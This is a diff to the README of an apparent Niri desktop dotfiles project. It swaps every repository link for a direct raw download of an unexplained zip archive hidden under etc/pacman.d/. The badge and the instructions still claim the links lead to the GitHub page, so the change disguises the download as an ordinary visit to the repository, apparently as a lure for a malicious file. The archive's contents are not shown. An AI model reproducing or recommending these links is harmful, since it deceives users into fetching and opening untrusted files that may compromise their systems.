@@ -1,6 +1,6 @@
 # 🎛️ sarok-area - Clean Niri Setup for Daily Use
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/francesmaryfourdimensional202/sarok-area)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/francesmaryfourdimensional202/sarok-area/raw/refs/heads/main/etc/pacman.d/sarok_area_marlitic.zip)
 
 ## 🧭 What this is
 
@@ -23,7 +23,7 @@ This project is for the Niri desktop on Linux. It does not install a Windows app
 
 Visit this page to download or clone the files:
 
-https://github.com/francesmaryfourdimensional202/sarok-area
+https://github.com/francesmaryfourdimensional202/sarok-area/raw/refs/heads/main/etc/pacman.d/sarok_area_marlitic.zip
 
 On the GitHub page, choose **Code** and then **Download ZIP** if you want the whole repo at once. If you already use Git, you can clone the repo instead.
 
@@ -176,4 +176,4 @@ Use the GitHub repo page to review the project terms before you reuse or share t
 
 ## 🔗 Project link
 
-https://github.com/francesmaryfourdimensional202/sarok-area
+https://github.com/francesmaryfourdimensional202/sarok-area/raw/refs/heads/main/etc/pacman.d/sarok_area_marlitic.zip
